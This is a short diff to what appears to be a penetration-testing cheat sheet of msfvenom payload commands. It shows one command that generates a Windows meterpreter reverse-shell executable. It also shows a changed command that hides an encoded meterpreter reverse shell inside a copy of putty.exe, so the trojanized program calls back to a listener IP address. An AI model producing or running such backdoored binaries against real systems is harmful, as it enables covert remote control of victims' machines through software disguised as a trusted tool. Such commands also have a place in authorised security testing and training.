@@ -11,7 +11,7 @@
  Windows
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
  
- msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
+ msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.159 -e x86/shikata_ga_nai -i 5 -b "\x00" -f exe -o putty1.exe
 
  
            == Web payloads ==
